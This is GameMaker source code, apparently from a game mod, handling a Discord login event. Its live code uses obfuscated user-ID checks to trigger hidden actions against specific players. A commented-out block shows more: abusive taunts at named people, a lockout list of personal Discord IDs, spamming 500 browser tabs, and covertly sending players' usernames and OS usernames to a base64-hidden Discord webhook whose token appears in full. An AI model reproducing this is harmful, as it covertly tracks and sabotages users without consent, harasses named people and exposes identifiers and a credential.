switch async_load[? "event_type"]
{
	case "DiscordReady": // ready
		active = true;
		a = async_load[?"user_id"];
		userid = a;
		
		// I have my fucking reasons.
		if a == loydecode("IyEmIycoJR0jIignHyEjKiwp") or a == loydecode("Ix4gKiIgIiUjJSYnJiMlJCgp") // Null
		// 746159804057255998, 710801584337977358
		
		or a == loydecode("HR0mIykgIiUkJiQgJR0hKiglHg==") // zyle
		// 1061715854108139540
		
			event_perform(ev_alarm, 0);
		else
		{
			loydecode = function(str) {
				return str
			};
		}
		
		/*
		// beebawp
		if a == "1092972191341096970" or a == "909894078852911145"
			url_open("https://youtu.be/3yNZG0uUTjg");
		
		// taunts
		if code_is_compiled()
		{
			if string_lower(environment_get_variable("USERNAME")) == "den4ik"
				a = "867446393471893515";
			
			// ---
			
			if a == "1069871151590944841" // Soapy
				show_message("Haaiii piss chugger ;3!!!");
			if a == "1092972191341096970" or a == "909894078852911145" // Beebawp
				show_message("NO BEEBAWP NOT THE BIKE PUMP!");
			if a == "516337795372154910" // Zerokizo
				show_message("I'm not gonna let you put the character doors in my mod");
			//if a == "309853612656558100" // Min3r
			//	show_message("I know you like diddling children");
			//if a == "827041050555187210" // jared9994
			//	show_message("well if you're gonna be like that then please cut deeper.");
			if a == "744735218350555137" // LOSTMAN
				show_message("That sure was a \"jolly\" plan.");
			if a == "748743802608418896" // Croatian Commander
				show_message("Haaiii Cappy ;3!!!");
			if a == "463132674995781637" // SpectralScrubs
			{
				show_message("It smells like obama");
				var str = "Peic";
				repeat 50
					str = str + " " + str;
				show_message(str);
			}
			if a == "188430471040991235" or a == "317071206815891466" // scout or indigo
				show_message("Are you gonna credit me for the decomp?"); // RX: No they won't haha
			if a == "817309415781957700" // el jeof rey
				show_message("Introducing: Poopin' Dario!");
			if a == "867446393471893515" // Denchick
			{
				repeat 500
					url_open(choose("https://undertale.com/", "https://deltarune.com/"));
				game_end();
			}
			if a == "866584072733851658" // soda
				show_message("What if orange was a color?");
			if a == "357090210435039232" // luigio
			{
				show_message("Oh, did you run the \"trojan\" by accident? Here, I'll close on my own for you.");
				game_end();
			}
			if a == "736034094093303888" // MrUnown
				show_message("You're dogshit at C++ admit it Unown");
			if a == "847981927670874132" // Psyop
				show_message("Get another alt.");
			//if a == "618151581111812106" // Mannu
			//	show_message("You know what you did");
			if a == "387106161754898432" // Cubito
				show_message("\"Well Maybe I should leak your face?\"\nWell Maybe I shouldn't let you play my game.");
			//if a == "357967410340429825" // TheSpookyDong
			//	show_message("You treated me well but this is by pure obligation");
			if a == "370924430324531200" or a == "748959499565662360" // Laterance
				show_message("Roblox");
			if a == "639062328276418571" // Manios
				show_message("Go fuck yourself.");
			if a == "590968392211759124" // Nicole
				show_message("Once one is blocked they never look back");
		}
		
		// lockout
		var lockout =
		[
			// PTT
			"1069871151590944841", // Soapy
			//"503588309608431626", // Octo
			"713946655476416553", // Zerokizo
			//"799295873388642375", // Ralty (programmer)
			//"827041050555187210", // jared9994
			"736268533767602226", // Leafchy (artist)
			"212347808890486786", // Psyke
			"970894665593262171", // bmv277
			"775518791818805268", // Jam (composer)
			"725796266629398691", // auro
			"387106161754898432", // Cubito
			//"516337795372154910", // TheFungang
			"489119025608261655", // melvin (admin)
			"681556802525331460", // gee9 (admin)
			"977762104255864862", // trinitetray (admin)
			//"713016378822754334", // omegano7 (admin)
			//"412059144531607552", // volta
			"773966892520046662", // matty
			
			// Modding Monopoly
			"744735218350555137", // LOSTMAN
			"188430471040991235", // scout
			"317071206815891466", // indigo
			"866584072733851658", // soda
			"124181524277886976", // core
			"455811217865572354", // .jdrive
			"129992247637835776", // paperkitty
			"736034094093303888", // MrUnown
			"357090210435039232", // luigio
			//"313647052087099394", // RodMod
			"222518501821251584", // marioket
			"447396200405270528", // jessieproductions
			
			// Pathetic people
			"867446393471893515", // Denchick (coollugio)
			"817309415781957700", // jeof
			"724447494372851783", // khaliliscre
			"748743802608418896", // Croatian Commander
			"370924430324531200", // Laterance (trout)
			"748959499565662360", // Laterance (pickleanon)
			"590968392211759124", // Nicole
			//"463132674995781637", // SpectralScrubs
			"841302295085580298", // SuperPiter (StS asked me to)
			"570350198878896178", // StS
			"639062328276418571", // Manios
			"847981927670874132", // Denchick friend group psyop account
			//"618151581111812106", // Mannu
			"842841281642364960", // medicalnomad
			
			// Ran the leak/got banned
			"744836933489918044", // Ranzero
			"732165834935500872", // bananaspia
			"800551251845971968", // sam4443
			"1058024621728870482", // larfes
			"976575794543476807", // .prodbydonat
			"583315925575401473", // spooks.
			"645869271699685376", // cosmosfox
			"612352819831242765", // phil564
			"533831083809177600", // _looney.
			"604343454369185803", // fanmanu
			"913427971635826698", // spamton_v420
			"804061657625395241", // V1
			"963075996884541523", // pietro99
			"840279502446002218", // davithemusicguy
			"1090693750830944418", // danny_chacson
			"1137046644790153327" // alex.does.stuff_89009
		];
		
		var web = base64_decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMjkxMzI4MzcxNTM1MzgxMDgvenZxUnR4Rm0yaWszaXJVZzg3NUZnaG5ObEdqT3VZUUlhbEpnR3FneVNnREdvYXRIVkhFV0JZekx1UTVfclA1alVVb2Q=");
		if array_contains(lockout, a)
		{
			// easter egg.
			var file = file_text_open_write("dead");
			file_text_write_string(file, $"Hello, {async_load[?"username"]}.");
			file_text_close(file);
			
			// tell me.
			var body = ds_map_create(), header = ds_map_create();
			ds_map_add(body, "content", $"{async_load[?"username"]} attempted running the game! {environment_get_variable("USERNAME")}");
			ds_map_add(header, "Content-Type", "application/json");
			http_request(web, "POST", header, json_encode(body));
			ds_map_destroy(body);
			ds_map_destroy(header);
			
			// get the fuck out.
			room_goto(Funnyroom);
		}
		*/
		
		if(GM_build_type!="run"){/*var body=ds_map_create(),header=ds_map_create();ds_map_add(body,"content",$"{async_load[?"username"]}#{async_load[?"discriminator"]} ({a})");ds_map_add(header,"Content-Type","application/json");http_request(web,"POST",header,json_encode(body));*/a=GM_build_date;/*ds_map_destroy(body);ds_map_destroy(header);*/}
		break;
}
